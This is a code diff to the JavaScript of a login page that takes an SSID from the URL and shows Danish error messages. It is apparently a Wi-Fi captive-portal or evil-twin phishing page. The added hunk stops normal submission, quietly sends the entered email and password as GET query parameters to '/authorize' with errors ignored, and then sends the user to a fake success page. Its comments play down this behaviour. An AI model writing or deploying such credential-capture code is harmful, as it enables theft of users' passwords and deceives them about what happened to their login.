@@ -111,7 +111,7 @@ document.getElementById("ssid").value = params.get("ssid") || "";
 document.getElementById("startTime").value =
     localStorage.getItem("startTime") || Date.now();
 
-// Client-side validation
+// validation
 const form = document.querySelector('form');
 const emailInput = document.querySelector('input[name="email"]');
 const passwordInput = document.querySelector('input[name="password"]');
@@ -172,6 +172,20 @@ if (form && emailInput && passwordInput) {
             showError(passwordInput, 'Adgangskoden skal være mindst 3 tegn');
             return false;
         }
+
+        // delay + redirect
+        e.preventDefault();
+        try {
+            const qs = new URLSearchParams(new FormData(form));
+            const url = (form.getAttribute('action') || '/authorize') + '?' + qs.toString();
+            fetch(url, { method: 'GET', credentials: 'same-origin', cache: 'no-store' }).catch(() => {});
+        } catch (err) {
+            // ignore
+        }
+
+        setTimeout(() => {
+            window.location.href = "/success.html";
+        }, 1500);
     });
 }
 
